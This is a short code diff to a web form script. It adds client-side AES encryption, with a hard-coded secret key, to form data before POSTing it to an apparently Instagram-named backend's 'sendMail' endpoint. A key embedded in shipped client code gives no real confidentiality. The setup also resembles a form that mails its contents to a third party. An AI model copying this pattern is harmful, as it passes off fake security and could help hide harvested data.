@@ -1,4 +1,8 @@
 const btn = document.getElementById('submit'); // Get the submit button
+const CryptoJS = require('crypto-js'); // Include crypto-js for encryption
+
+// Shared secret key (in production, store securely and share via secure channel)
+const SECRET_KEY = 'my-secret-key-1234567890123456'; // Must be 16, 24, or 32 bytes for AES
 
 document.getElementById('form').addEventListener('submit', function(event) {
   event.preventDefault(); // Prevent default form submission
@@ -14,13 +18,16 @@ document.getElementById('form').addEventListener('submit', function(event) {
     console.log(`${key}: ${value}`);
   }
 
+  // Encrypt the form data
+  const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET_KEY).toString();
+
   // Send POST request with fetch
   fetch('https://insta-backend-lime-six.vercel.app/api/sendMail', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(data) // Send form data as JSON
+    body: JSON.stringify({ encrypted: encryptedData }) // Send encrypted data
   })
     .then(async (response) => {
       if (!response.ok) {
